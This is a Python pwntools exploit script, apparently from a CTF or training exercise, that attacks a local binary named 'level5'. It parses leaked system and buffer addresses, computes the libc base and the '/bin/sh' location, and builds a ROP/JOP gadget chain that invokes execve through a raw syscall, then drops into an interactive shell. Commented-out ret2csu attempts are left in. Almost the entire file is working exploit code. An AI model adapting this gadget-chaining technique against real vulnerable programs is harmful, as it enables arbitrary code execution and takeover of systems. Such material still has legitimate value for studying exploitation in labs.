from pwn import*
# context.log_level="debug"

p = process('./level5')
elf = ELF('./level5')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# write_got = elf.got['write']
# main = elf.symbols['main']
start = 0x40067a
end = 0x400660
fill=136

# def csu(rbx, rbp, r12, r13, r14, r15, last):

#     payload = 'a' * 0x88
#     payload += p64(start) + p64(rbx) + p64(rbp) + p64(r12) + p64(
#         r13) + p64(r14) + p64(r15)
#     payload += p64(end)
#     payload += 'a' * 0x38
#     payload += p64(last)
#     p.send(payload)
#     sleep(1)


print "*********system address******"
system_addr_str=p.recvuntil('\n')
system_addr = int(system_addr_str,16)
print "system_addr = " + hex(system_addr)

print "*********buf address******"
buf_addr_str = p.recvuntil('\n')
buf_addr = int(buf_addr_str,16)
print "buf_addr = " + hex(buf_addr)



# print "*********leak write*****"
# write_lib = libc.symbols['write']
# print "write_lib = "+hex(write_lib)

# csu(0,1,write_got,8,write_got,1,main)

# write_addr = u64(p.recv(8))
# print "write_addr --> [%s]" %hex(write_addr)


print "*********lib base******"
lib_base = system_addr - libc.symbols['system']
print "libc base ="+ hex(lib_base)



print "*********binsh_addr******"
binsh_addr_offset = next(libc.search('/bin/sh')) -libc.symbols['system']
binsh_addr = system_addr + binsh_addr_offset
print "binsh_addr = " + hex(binsh_addr)


# print "************payload***************"
L1=lib_base+0x00000000000ea69a #: pop rcx ; pop rbx ; ret
L2=lib_base+0x0000000000033544 #: pop rax ; ret
L3=lib_base+0x0000000000021102 #: pop rdi ; ret
L4=lib_base+0x00000000000202e8 #: pop rsi ; ret
L5=0x40079a #add    %rdi,%rsi  # L5=lib_base+0x0000000000033412 #: add rsi, rdi ; jmp rsi
L6=lib_base+0x00000000000202e8 #: pop rsi ; ret
L7=lib_base+0x00000000000026bf #: syscall

JMP1=lib_base+0x0000000000084caa #: pop r12 ; jmp rax
JMP2=lib_base+0x000000000011437d #: mov rdx, r12 ; call rax
JMP3=lib_base+0x0000000000135876 #: pop rax ; jmp rcx
JMP4=lib_base+0x0000000000135876 #: pop rax ; jmp rcx
JMP5=lib_base+0x0000000000021102 #: pop rdi ; ret

print "L1="+hex(L1)
print "L2="+hex(L2)
print "L3="+hex(L3)
print "L4="+hex(L4)
print "L5="+hex(L5)
print "L6="+hex(L6)
print "L7="+hex(L7)

print "JMP1="+hex(JMP1)
print "JMP2="+hex(JMP2)
print "JMP3="+hex(JMP3)
print "JMP4="+hex(JMP4)
print "JMP5="+hex(JMP5)

payload = p64(JMP1)+p64(JMP2)+p64(JMP3)+p64(JMP4)+p64(JMP5)
payload += "\x00"*(fill-5*8) +p64(L1)+p64(L5)+p64(0)+p64(L2)+p64(L5)+p64(L3)+p64(8)+p64(L4)+p64(buf_addr-8)
payload += p64(L5)+p64(0)+p64(0x3b)+p64(binsh_addr)+p64(L6)+p64(0)+p64(L7)

print "\n##########sending payload##########\n"
# pwnlib.gdb.attach(p)
# pause()
p.send(payload)
p.interactive()


# p.recvuntil('Hello, World\n')
# p.send(payload)
# sleep(1)
# # pwnlib.gdb.attach(p)
# # pause()
# p.send(p64(system_add)+'/bin/sh\x00')
# sleep(1)

# payload = junk + p64(start)
# payload += p64(0) + p64(1) + p64(bss) + p64(0) + p64(0) + p64(bss+8)
# payload += p64(end)
# payload += 'a'*0x38
# payload +=p64(main)
# p.recvuntil('Hello, World\n')
# sleep(1)
# p.send(payload)

# p.interactive()